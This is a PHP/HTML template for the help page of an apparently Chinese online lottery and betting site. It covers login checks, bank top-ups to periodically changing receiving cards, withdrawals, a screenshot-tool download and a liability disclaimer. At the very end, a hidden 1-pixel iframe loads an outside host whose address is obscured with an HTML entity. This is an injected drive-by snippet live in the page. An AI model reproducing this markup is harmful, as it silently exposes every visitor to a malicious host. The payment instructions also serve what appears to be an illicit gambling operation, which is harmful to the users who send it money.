<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<?php $this->display('inc_skin.php',0,'首页'); ?>
</head>
<body>
<?php $this->display('inc_header.php'); ?>
<script type="text/javascript">
    $(function() {
        $("#tab").find("span").click(function() {
            $("#tab").find("span").attr("class", "tab-back");
            $(this).attr("class", "tab-front");
            var id = $(this).attr("id").split("_");
            $(".news_list").hide();
            $("#content_" + id[1]).show();
        });
        var id = 0;
        if (id > 0) {
            $("#tab_" + id).click();
        }
    });
</script>
  <div id="rightcon">
            <div class="wrapper bigbox">
     <div class="page-wrapper">
    <?php $this->display('inc_left_4.php'); ?><div class="top_menu">
        <a class="act" href="<?=$this->basePath('Help-index') ?>">常见问题</a>
        <a href="<?=$this->basePath('Help-wanfa') ?>">玩法介绍</a>
        <a href="<?=$this->basePath('Help-gongneng') ?>">功能介绍</a>
    </div>
    <div class="page-info">
        <div id="tab" class="page_list">
            <table border="0" cellpadding="0" cellspacing="0">
                <tbody><tr><td class="page_bar">
                             <a><span id="tab_1" class="tab-front">常见问题</span></a>
							 <a><span id="tab_2" class="tab-back">在线充值说明</span></a>
							 <a><span id="tab_3" class="tab-back">平台提现说明</span></a>
							 <a><span id="tab_4" class="tab-back">在线客服说明</span></a>
							 <a><span id="tab_5" class="tab-back">免责声明</span></a>
                </td></tr></tbody>
            </table>
        </div>
        <div class="page_list">
          <table>
<tbody>
<tr>
	<td>
		<ul id="content_1" class="news_list" style="display:block">
			<li>
			<ul>
				<p>
					<span style="color: rgb(255, 102, 0);"><strong>一、如何识别域名是否归属本平台？</strong></span>
				</p>
				<li>1、通过唯一的域名验证网址 <a href="http://www.newbee.net/" target="_blank">www.newbee.net </a>验证域名是否属于本平台；</li>
				<li>
				<p>
					2、使用 <a href="http://www.newbee.net/" target="_blank">www.newbee.net</a>&nbsp;验证通过的网址登陆账号，在账户中心的修改密码中设置“登陆问候语”，设置后每次登陆平台都会提示此问候语，问候语与您设置的一致，则是正确网址，反之则是仿冒平台。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<span style="color: rgb(255, 102, 0);"><strong>二、登陆过程中跳转到谷歌界面？</strong></span>
				</p>
				<li>1、用户名输入错误导致。</li>
				<li>
				<p>
					2、帐号不存在。
				</p>
				</li>
				<li>
				<p>
					3、当前域名为非系统指定域名，请联系上级或客服获取最新域名。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<strong><span style="color: rgb(255, 102, 0);">三、忘记密码怎么办？</span></strong>
				</p>
				<li>1、登录密码遗忘，可通过资金密码在平台登陆页面重新设置登录密码。</li>
				<li>
				<p>
					2、资金密码遗忘，但有登录密码请联系在线客服协助处理。
				</p>
				</li>
				<li>
				<p>
					3、建议您初始拿到帐号请到平台“账户中心”-“修改密码”处进行登陆密码、资金密码、登陆问候语的设定；并请妥善保管好您的资金密码，如果资金密码和登录密码同时遗忘将无法再修改和找回密码。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<strong><span style="color: rgb(255, 102, 0);">四、平台充值限额及服务时间？</span></strong>
				</p>
				<li>
				<p>
					“工行在线充值”
				</p>
				<p>
					&nbsp;&nbsp;&nbsp;&nbsp; 服务时间：每日上午09:00至次日凌晨02:00。
				</p>
				<p>
					&nbsp; &nbsp; &nbsp;充值限额：单笔最低充值50，最高充值20000。
				</p>
				</li>
				<li>
				<p>
					“建行在线充值”
				</p>
				<p>
					&nbsp; &nbsp; &nbsp;服务时间：每日上午09:00至次日凌晨02:00。
				</p>
				<p>
					&nbsp; &nbsp; &nbsp;充值限额：单笔最低充值50，最高充值20000。
				</p>
				</li>
				<li>
				<p>
					“农行在线充值”
				</p>
				<p>
					&nbsp; &nbsp; &nbsp;服务时间：每日上午09:00至次日凌晨02:00。
				</p>
				<p>
					&nbsp; &nbsp; &nbsp;充值限额：单笔最低充值50，最高充值20000。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<span style="color: rgb(255, 102, 0);"><strong>五、平台提现限额及服务时间？</strong></span>
				</p>
				<li>
				<p>
					平台提现支持“工商银行”、“农业银行”、“招商银行”，陆续会支持更多银行提现。
				</p>
				<p>
					提现限额：单笔最低提现100，最高提现50000。
				</p>
				</li>
				<li>
				<p>
					服务时间：每日上午10:00至次日凌晨02:00。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<strong><span style="color: rgb(255, 102, 0);">六、为什么充值没有即时到帐？</span></strong>
				</p>
				<p>
					以下几点都会导致您的充值不能到账，如果出现以下问题，请及时联系在线客服并提供银行回单截图。
				</p>
				<li>
				<p>
					1、汇款时未使用平台提供的最新银行信息；
				</p>
				</li>
				<li>
				<p>
					2、汇款时附言（充值编码）填写错误或者未填写；
				</p>
				</li>
				<li>
				<p>
					3、平台填写金额与实际汇款金额不一致；
				</p>
				</li>
				<li>
				<p>
					4、充值时间在平台服务时间以外。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<strong><span style="color: rgb(255, 102, 0);">七、游戏撤单问题？</span></strong>
				</p>
				<li>
				<p>
					1、任何彩种游戏的撤单都必须在停止投注之前进行，当期投注时间截止后将无法再进行撤单操作；
				</p>
				</li>
				<li>
				<p>
					2、追号单的撤单需要到“游戏记录”-“追号记录”中进行终止任务。
				</p>
				</li>
				<li>
				<p>
					3、凡金额超过5000元的撤单，平台均收取0.5%的手续费。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<strong><span style="color: rgb(255, 102, 0);">八、什么是“奖金限额”？平台奖金限额是多少？</span></strong>
				</p>
				<li>
				<p>
					1、每个账号在同一游戏、同一玩法、同一奖期中购买相同号码的最大可中奖金额称为奖金限额。
				</p>
				</li>
				<li>
				<p>
					2、平台奖金限额为：高频彩（时时彩、时时乐、11选5）奖金限额20万，低频彩（3D、排列三/五）奖金限额10万。
				</p>
				</li>
				<li>
				<p>&nbsp;
					
				</p>
				</li>
			</ul>
			<ul>
				<p>
					<span style="color: rgb(255, 102, 0);"><strong>九、关于第3方开奖机构不开奖问题？</strong></span>
				</p>
				<p>
					所有游戏，如遇第3方开奖机构不开奖，平台会对未获得开奖号码的期数进行撤单返款。撤单后无论第三方以任何形式补开，平台均维持撤单处理。
				</p>
			</ul>
			<p>&nbsp;
				
			</p>
			</li>
		</ul>
		<ul id="content_2" class="news_list" style="display:none">
			<li>
			<p>
				<span style="color: rgb(255, 0, 0); ">在充值之前，请认真阅读充值使用说明，以确保整个充值流程</span><span style="color: rgb(255, 0, 0); ">不发生错误，充值能正常到账</span><span style="color: rgb(255, 0, 0); ">。</span>
			</p>
			<ul>
				第一步：
				<p>
					点击前台<strong>【充值】</strong>或<strong>【充值提现】</strong>，选择<strong>【自动充值】</strong>，然后选择<strong>“中国建设银行”</strong>，选择一张您绑定在平台的建行卡，输入充值金额，然后点击下一步。
				</p>
			</ul>
			<ul>
				第二步：
				<p>
					获取到平台最新的建设银行的<strong>“收款账户名”，“<span style="color: rgb(0, 0, 255);">收款账号</span>” </strong>等信息。
				</p>
				<p>
					<span style="color: rgb(255, 0, 0); ">平台会不定期更换收款银行卡，请在汇款前确认最新的收款卡信息，如果汇款到非最新的收款卡而导致的损失与本平台无关。</span>
				</p>
			</ul>
			<ul>
				第三步：
				<p>
					使用您刚才选择的绑定在平台的建行卡，登录中国建设银行网上银行，，然后点击<span style="color: rgb(0, 0, 255);"><strong>【转账汇款】</strong></span>选择<span style="color: rgb(0, 0, 255);">“<b>活期转账汇款</b></span>”。
				</p>
				<p>
					第四步：
				</p>
			</ul>
			<ul>
				<p>
					按以下图解对应填入相关信息：
				</p>
				<p>
					<img src="default_home_data/ccb.png" alt="">
				</p>
				<p>&nbsp;
					
				</p>
			</ul>
			<ul>
				第五步：
				<p>
					然后点击“下一步”并确认信息，输入U盾密码等步骤完成建行汇款。
				</p>
			</ul>
			<ul>
				第六步：
				<p>
					汇款完成后到平台查看到账情况，自动充值一般1分钟内到账。
				</p>
				<p>
					如果5分钟内未到账，请提供您的<strong>汇款银行，汇款金额，汇款卡号</strong>后8位给在线客服进行核实处理。
				</p>
			</ul>
			<p>&nbsp;
				
			</p>
			</li>
		</ul>
		<ul id="content_3" class="news_list" style="display:none">
			<li>
			<div style="width:600px;margin-left: 50px">
				<div>
					<strong>截图工具的下载及使用：</strong>
				</div>
				<div>
					&nbsp;
				</div>
				<div>
					<strong>第一步，</strong>单击 <a href="http://images.nb89.net/images/help/screentool.rar">&nbsp;截屏工具&nbsp;</a> 下载截图工具;
				</div>
				<div>
					<strong>第二步，</strong>下载完成后首先对文件包进行解压缩，解压后双击运行截屏工具进行截图;<br>
					<br>
					<img src="default_home_data/capture_screen1.jpg" alt="">
				</div>
				<div>
					<strong>第三步，</strong>单击保存，将保存图片到某个目录下;<br>
					<br>
					<img src="default_home_data/capture_screen2.jpg" alt="">
				</div>
				<div>
					<strong>第四步，</strong>单击发送文件按钮<br>
					<br>
					<img src="default_home_data/send_picture1.jpg" alt=""><br>
					<br>
找到刚才您所保存的图片并双击选择该图片
					<br>
					<br>
					<img src="default_home_data/send_picture2.jpg" alt=""><br>
					<br>
单击发送按钮发送图片。
					<br>
					<br>
					<img src="default_home_data/send_picture3.jpg" alt="">
				</div>
			</div>
			</li>
		</ul>
		<ul id="content_4" class="news_list" style="display:none">
			<li>
			<ul>
				第一步：
				<p>
					进入<strong>【账户中心】</strong>选择<strong>【我的银行卡】</strong>，然后进行<strong>“绑定银行卡”</strong>操作，如果已有绑定的银行卡，可以跳过这一步。
				</p>
			</ul>
			<ul>
				第二步：
				<p>
					填写要<strong>“提现金额”</strong>、选择已绑定在平台的<strong>“收款银行卡”</strong>，然后点击下一步。
				</p>
			</ul>
			<ul>
				第三步：
				<p>
					在确认页面，确认提现涉及的所有信息，包括：<strong>实扣金额，到账金额</strong>，以及<strong>提现银行卡</strong>信息是否正确，如无误，则提交。
				</p>
			</ul>
			<ul>
				第四步：
				<p>
					查看<strong>“提现记录”</strong>，并跟踪处理情况，如果系统已处理好转账，提现记录中的申请状态会变为<strong>“提现成功”</strong>。
				</p>
			</ul>
			<ul>
				第五步：
				<p>
					根据提现银行卡，到具体的银行查看到账情况。
				</p>
			</ul>
			</li>
		</ul>
		<ul id="content_5" class="news_list" style="display:none">
			<li>
			<p>
				<strong>尊敬的客户：为避免在游戏平台使用中可能发生的各种争议，请会员与代理在开始使用本平台前，仔细阅读下述内容，客户开始使用平台即被视为已接受所有协议与规定。</strong>
			</p>
			<p>
				1、会员与代理有责任确保自己的帐户、登陆和资金密码、银行卡资料的保密性，在符合网站规定下的所有投注，都被视为有效。若会员或代理账户被盗用
后，所进行的投注或因此导致的损失，本公司将不承担任何责任。若您发现或怀疑自己的资料被盗用，请立即通知在线客服，并立即更改密码。
			</p>
			<p>
				2、本平台的开奖数据完全来源于具有公信力的第三方公布的有效开奖结果，如发生因开奖机构引起的开奖异常，本公司将不承担任何责任。
			</p>
			<p>
				3、本平台只支持个人网上银行及时到账的汇款方式，不支持任何跨行转账、手机转账、ATM转账等，如果使用非个人网银及时到账的汇款方式而导致的损失，本公司将不承担任何责任。
			</p>
			<p>
				4、平台会不定期更换收款银行卡，客户在充值前有义务确认本平台收款银行账户，如因客户向平台汇款时，汇入错误银行卡或者非最新收款卡而导致的损失，本公司将不承担任何责任。
			</p>
			<p>
				5、本平台敬请广大客户选择平台提供的自动充值方式直接与公司进行充值汇款，并请客户慎重选择代理代充，如果由于使用代理代充而导致的损失，本公司将不承担任何责任。
			</p>
			<p>
				（<strong>所谓代充是指：代理提供自己的银行账号给下级用户，下级将钱汇款到上级指定的银行账号中，收到汇款后，上级给下级用户的平台账号加游戏币</strong>。）
			</p>
			<p>
				6、本平台保有修订、更新和修改本条款和游戏规则的权利。任何修订、更新和修改将在平台上公布，客户在上述修订、更新和修改公布后，继续使用本平台进行游戏时，则视为客户同意并接受本平台对免责申明的修订、更新和修改。
			</p>
			</li>
		</ul>
	</td>
</tr>
</tbody>
</table>
        </div>
    </div>
</div>
</div>
</div>        
<?php $this->display('inc_footer.php') ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
